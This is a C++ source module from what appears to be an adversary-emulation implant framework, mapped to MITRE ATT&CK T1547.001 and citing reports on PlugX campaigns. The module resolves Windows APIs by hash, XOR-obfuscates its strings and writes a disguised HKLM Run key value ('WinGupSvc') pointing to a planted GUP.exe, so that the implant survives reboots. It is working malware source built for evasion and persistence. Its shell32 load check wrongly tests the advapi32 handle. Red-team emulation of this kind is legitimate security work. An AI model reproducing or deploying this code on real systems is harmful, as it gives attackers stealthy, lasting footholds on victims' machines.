#include "module_registry.hpp"
#include "CreateRegistryRunKey.hpp"
#include <al/import.hpp>
#include "util.hpp"
#include "fnv1a.hpp"

// Populates function pointers for registry key creation
DWORD FetchFunctions(registry_pointers* fp) {
    auto kernel32 = GM(L"KERNEL32.DLL", by_ror13);
    if (!kernel32) {
        return FAIL_GET_KERNEL32;
    }

    auto llw = GP(kernel32, LoadLibraryW, by_fnv1a);
    if (!llw) {
        return FAIL_GET_LOADLIBRARYW;
    }

    HMODULE advapi32 = llw(L"advapi32.dll"_xor);
    if (!advapi32) {
        return FAIL_LOAD_LIBRARY_CUSTOM_MODULE_ADVAPI32;
    }

    HMODULE shell32 = llw(L"shell32.dll"_xor);
    if (!advapi32) {
        return FAIL_LOAD_LIBRARY_CUSTOM_MODULE_SHELL32;
    }

    fp->fp_SHGetFolderPathA = GP(shell32, SHGetFolderPathA, by_fnv1a);
    if (!(fp->fp_SHGetFolderPathA)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_SHGETFOLDERPATHA;
    }

    fp->fp_RegCreateKeyExA = GP(advapi32, RegCreateKeyExA, by_fnv1a);
    if (!(fp->fp_RegCreateKeyExA)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_REGCREATEKEYEXA;
    }

    fp->fp_RegSetValueExA = GP(advapi32, RegSetValueExA, by_fnv1a);
    if (!(fp->fp_RegSetValueExA)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_REGSETVALUEEXA;
    }

    fp->fp_RegCloseKey = GP(advapi32, RegCloseKey, by_fnv1a);
    if (!(fp->fp_RegCloseKey)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_REGCLOSEKEY;
    }
    return ERROR_SUCCESS;
}

/*
 * HandleCreateRegistryRunKey:
 *      About:
 *          Creates a registry run key to establish persistence.
 *      Result:
 *          Registry run key created.
 *      MITRE ATT&CK Techniques:
 *          T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
 *      CTI:
 *          https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
 *          https://www.trendmicro.com/en_us/research/24/i/earth-preta-new-malware-and-strategies.html
 *          https://www.trendmicro.com/en_us/research/24/i/earth-preta-new-malware-and-strategies.html
 *          https://lab52.io/blog/mustang-pandas-plugx-new-variant-targetting-taiwanese-government-and-diplomats/
 */
void HandleCreateRegistryRunKey(void* data, void* context, logger_ctx* log_ctx) {
    module_context_t* m_ctx = (module_context_t*)data;
    registry_pointers* ctx = (registry_pointers*)context;

    char valueData[MAX_PATH];

    HRESULT getPathResult = ctx->fp_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, valueData);
    if (getPathResult == S_OK) {
        size_t length = strlen(valueData);

        if (length + strlen("\\EvRDRunMP\\GUP.exe") + 1 < MAX_PATH) {
            pi_memcpy(valueData + length, "\\EvRDRunMP\\GUP.exe"_xor, strlen("\\EvRDRunMP\\GUP.exe") + 1);

            HKEY hKey;
            DWORD disposition;

            AesLogger::LogDebug(log_ctx, "Accessing registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run."_xor);
            LSTATUS regResult = ctx->fp_RegCreateKeyExA(
                HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"_xor,
                0, NULL, 0,
                KEY_WRITE,
                NULL,
                &hKey,
                &disposition
            );
            if (regResult == ERROR_SUCCESS) {
                // if creation success, set the key
                AesLogger::LogDebug(log_ctx, "Setting registry key data for value WinGupSvc to %s."_xor, valueData);
                regResult = ctx->fp_RegSetValueExA(
                    hKey,
                    "WinGupSvc"_xor,
                    0,
                    REG_SZ,
                    (const BYTE*)valueData,
                    (DWORD)(strlen(valueData) + 1)
                );
                ctx->fp_RegCloseKey(hKey);

                if (regResult == ERROR_SUCCESS) {
                    AesLogger::LogSuccess(log_ctx, "Successfully set registry key and value."_xor);
                    m_ctx->output = (char*)"Successfully set registry key and value.";
                    m_ctx->outputSize = strlen((char*)m_ctx->output);
                } else {
                    AesLogger::LogError(log_ctx, "Failed to set registry key value. RegSetValueExA returned: %x"_xor, regResult);
                    m_ctx->output = (char*)"Failed to set registry key value.";
                    m_ctx->outputSize = strlen((char*)m_ctx->output);
                }
            } else {
                AesLogger::LogError(log_ctx, "Failed to access registry key. RegCreateKeyExA returned: %x"_xor, regResult);
                m_ctx->output = (char*)"Failed to access registry key.";
                m_ctx->outputSize = strlen((char*)m_ctx->output);
            }
        } else {
            AesLogger::LogError(log_ctx, "File path too long."_xor);
            m_ctx->output = (char*)"File path too long.";
            m_ctx->outputSize = strlen((char*)m_ctx->output);
        }
    } else {
        AesLogger::LogError(log_ctx, "Failed to get local appdata path. SHGetFolderPathA returned HRESULT: %x"_xor, getPathResult);
        m_ctx->output = (char*)"Failed to resolve CSIDL_LOCAL_APPDATA.";
        m_ctx->outputSize = strlen((char*)m_ctx->output);
    }

    return;
}

DWORD RegisterModule_CreateRegistryRunKey(sh_context* ctx, uint32_t module_id) {
    registry_pointers* m_ctx = (registry_pointers*)ctx->fp.fp_malloc(sizeof(registry_pointers));
    if (!m_ctx) {
        AesLogger::LogError(ctx->log_ctx, "Failed to allocate memory for module with ID 0x%x."_xor, module_id);
        return CUSTOM_MODULE_CREATEREGISTRYRUNKEY_FAIL_MALLOC_STRUCT;
    }

    DWORD result = ERROR_SUCCESS;

    result = FetchFunctions(m_ctx);
    if (result != ERROR_SUCCESS) {
        ctx->fp.fp_free(m_ctx);
        AesLogger::LogError(ctx->log_ctx, "Failed to fetch functions for module with ID 0x%x. Error code: %d"_xor, module_id, result);
        return CUSTOM_MODULE_CREATEREGISTRYRUNKEY_FAIL_GET_POINTERS;
    }


    result = RegisterModule(ctx, module_id, HandleCreateRegistryRunKey, m_ctx);
    if (result != ERROR_SUCCESS) {
        ctx->fp.fp_free(m_ctx);
        AesLogger::LogError(ctx->log_ctx, "Failed to register module ID 0x%x. Error code: %d"_xor, module_id, result);
        return CUSTOM_MODULE_CREATEREGISTRYRUNKEY_FAIL_REGISTER_MODULE;
    }

    AesLogger::LogSuccess(ctx->log_ctx, "Successfully registered module 0x%x."_xor, module_id);

    return result;
}
